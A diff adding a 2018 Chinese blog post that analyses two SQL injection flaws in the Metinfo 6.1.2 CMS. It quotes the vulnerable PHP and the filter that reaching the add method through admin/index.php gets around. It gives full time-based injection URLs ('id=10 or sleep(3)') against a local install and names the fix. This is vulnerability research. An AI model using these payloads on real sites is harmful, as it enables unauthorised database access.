@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Metinfo6.1.2 两处sql注入分析 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/10/Metinfo6-1-2-两处sql注入分析/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+                        
+                    </div>
+                    <h1>Metinfo6.1.2 两处sql注入分析</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-10-16
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Metinfo算是我审的第一个cms吧，前期感觉算是一个写的不怎么好的cms，伪全局变量的问题更是不知道引发了多少次漏洞。还记得那些网上的审计教程，说到变量覆盖这个问题都是以metinfo来举例的。但后期逐渐来了次mvc的大换血，框架更新了下，变量问题也得到了相应调整，也算是逐渐在变好吧。</p>
+<p>说了那么多，由于是第一个接触的cms问题，最近被爆出洞也就跟着一起复现了下（我好菜啊。。反正我就挖不到</p>
+<h1 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h1><p>漏洞出现在<code>app/system/message/web/message.class.php:37</code>的<code>add</code>函数中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_M;</span><br><span class="line">    <span class="keyword">if</span>(!$_M[form][id])&#123;</span><br><span class="line">        $message=DB::get_one(<span class="string">"select * from &#123;$_M[table][column]&#125; where module= 7 and lang ='&#123;$_M[form][lang]&#125;'"</span>);</span><br><span class="line">        $_M[form][id]=$message[id];</span><br><span class="line">    &#125;</span><br><span class="line">    $met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">    $_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>{$_M[form][id]}</code>没有被单引号包裹起来，从而可能产生注入。</p>
+<p>但是是个cms就会存在字符串过滤，来看下其中的过滤语句<code>app/system/include/function/common.func.php:51</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string, $force = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line">	<span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = daddslashes($val, $force);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">				$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$string = trim(addslashes($string));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sqlinsert</code>函数里过滤了相当多的sql关键字，而且只要匹配到出现，参数就直接返回空（相当暴力了</p>
+<p>这样，就要想办法绕过<code>!defined(&#39;IN_ADMIN&#39;)</code>限制，全局搜索一下这个定义的地方，就可以看到是在<code>admin/index.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//接口</span></span><br><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>但是直接去访问<code>add</code>模块的时候，就显示</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add</span><span class="bash"> <span class="keyword">function</span> no permission load!!!</span></span><br></pre></td></tr></table></figure>
+<p>是由于其只能调用带<code>do</code>的方法，这样，恰好在<code>add</code>函数上方，就存在一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">domessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_M;</span><br><span class="line">    <span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'action'</span>] == <span class="string">'add'</span>)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;check_field();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;add($_M[<span class="string">'form'</span>]);</span><br><span class="line">&#125;	...</span><br></pre></td></tr></table></figure>
+<p>恰好调用了<code>$this-&gt;add($_M[&#39;form&#39;]);</code>,<code>$_M[&#39;form&#39;]</code>里保存的就是POST和GET传入的参数</p>
+<p>然后就是构造payload，这里需要绕过<code>$this-&gt;check_field()</code>的验证，只要抓取正常留言的参数，就可以绕过，于是payload就变成了如下</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/metinfo6.1.2/admin/index.php</span></span><br><span class="line">?m=web</span><br><span class="line"><span class="variable">&amp;n</span>=message</span><br><span class="line"><span class="variable">&amp;c</span>=message</span><br><span class="line"><span class="variable">&amp;a</span>=domessage</span><br><span class="line"><span class="variable">&amp;action</span>=add</span><br><span class="line"><span class="variable">&amp;para137</span>=admin</span><br><span class="line"><span class="variable">&amp;para186</span>=a@a.com</span><br><span class="line"><span class="variable">&amp;para138</span>=<span class="number">15555555555</span></span><br><span class="line"><span class="variable">&amp;para139</span>=admin</span><br><span class="line"><span class="variable">&amp;para140</span>=admin</span><br><span class="line"><span class="variable">&amp;id</span>=<span class="number">10</span> or sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p>这里我直接把sql语句die了出来</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Metinfo6-1-2-两处sql注入分析/3.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Metinfo6-1-2-两处sql注入分析/1.png" alt></p>
+<p>可以看到这里直接拼接到了sql语句中，不过需要控制好sleep的时间，跟数据条数有关，不过这里只是用于验证了</p>
+<p>而且这里验证码的判断是在执行这条语句之后，否则，正常情况是要通过验证码判断才能执行语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">$_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line"><span class="keyword">if</span>(!$_M[config][met_fd_ok])okinfo(<span class="string">'javascript:history.back();'</span>,<span class="string">"&#123;$_M[word][Feedback5]&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]))&#123;</span><br><span class="line">        okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实际情况中，漏洞原作者提供了一个更好的布尔盲注方式，可以参考<a href="https://bbs.ichunqiu.com/thread-46687-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-46687-1-1.html</a></p>
+<p>至于修复的话，就主要就是把<code>id</code>变量用单引号引起来就可以了</p>
+<h1 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h1><p>这个漏洞和之前的洞很相似了，但是存在限制条件</p>
+<p>漏洞发生在<code>app/system/feedback/web/feedback.class.php:39</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_M;</span><br><span class="line">    $query=<span class="string">"select * from &#123;$_M[table][config]&#125; where name ='met_fd_ok' and columnid='&#123;$_M[form][id]&#125;' and lang='&#123;$_M[form][lang]&#125;'"</span>;</span><br><span class="line"></span><br><span class="line">    $met_fd_ok=DB::get_one($query);</span><br><span class="line">    $_M[config][met_fd_ok]=$met_fd_ok[value];</span><br><span class="line">    <span class="keyword">if</span>(!$_M[config][met_fd_ok])&#123;</span><br><span class="line">    	okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'Feedback5'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line">         <span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]) )&#123;</span><br><span class="line">            okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checkword() &amp;&amp; <span class="keyword">$this</span>-&gt;checktime())&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span>($value[tmp_name])&#123;</span><br><span class="line">            	$ret = <span class="keyword">$this</span>-&gt;upfile-&gt;upload($key);<span class="comment">//上传文件</span></span><br><span class="line">            <span class="keyword">if</span> ($ret[<span class="string">'error'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                    $info[$key]=$ret[path];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    okinfo(<span class="string">'javascript:history.back();'</span>,$_M[word][opfailed]);</span><br><span class="line">            	&#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $user = <span class="keyword">$this</span>-&gt;get_login_user_info();</span><br><span class="line">    $fromurl= $_M[<span class="string">'form'</span>][<span class="string">'referer'</span>] ? $_M[<span class="string">'form'</span>][<span class="string">'referer'</span>] : HTTP_REFERER;</span><br><span class="line">    $ip=getip();</span><br><span class="line"></span><br><span class="line">    $feedcfg=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;'and name='met_fd_class' and columnid ='&#123;$_M[form][id]&#125;'"</span>);</span><br><span class="line">    $_M[config][met_fd_class]=$feedcfg[value];</span><br><span class="line">    $fdclass2=<span class="string">"para"</span>.$_M[config][met_fd_class];</span><br><span class="line">    $fdclass=$_M[form][$fdclass2];</span><br><span class="line">    $title=$fdclass.<span class="string">" - "</span>.$_M[form][fdtitle];</span><br><span class="line">    $addtime=date(<span class="string">'Y-m-d H:i:s'</span>,time());</span><br><span class="line">    $met_fd_type=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_type' and columnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">	....</span><br></pre></td></tr></table></figure>
+<p>还是最后一句的sql语句中没有单引号保护，但是可以看到前面有一个比较头疼的限制就是验证码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]) )&#123;</span><br><span class="line">    	okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我这里图个方便，测试的时候就直接把验证码部分注释了</p>
+<p>还是和之前一样的调用方式，就可以调用到这个<code>add</code>方法</p>
+<p>需要注意的几点是，<code>lang=cn</code>还有<code>id=44</code></p>
+<p>最后的payload</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/metinfo6.1.2/admin/index.php</span></span><br><span class="line">?m=web</span><br><span class="line"><span class="variable">&amp;n</span>=feedback</span><br><span class="line"><span class="variable">&amp;c</span>=feedback</span><br><span class="line"><span class="variable">&amp;a</span>=dofeedback</span><br><span class="line"><span class="variable">&amp;lang</span>=cn</span><br><span class="line"><span class="variable">&amp;id</span>=<span class="number">44</span> or sleep(<span class="number">0.01</span>)</span><br><span class="line"><span class="variable">&amp;action</span>=add</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Metinfo6-1-2-两处sql注入分析/2.png" alt></p>
+<p>实际当中就需要每次输入验证码，还有个120秒的请求限制</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/10/Thinkphp-聚合查询漏洞/" data-toggle="tooltip" data-placement="top" title="ThinkPHP 聚合查询漏洞">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/10/phar-fastcgi-rsync-漏洞小结/" data-toggle="tooltip" data-placement="top" title="phar & fastcgi & rsync 漏洞小结">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic&#39;s Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
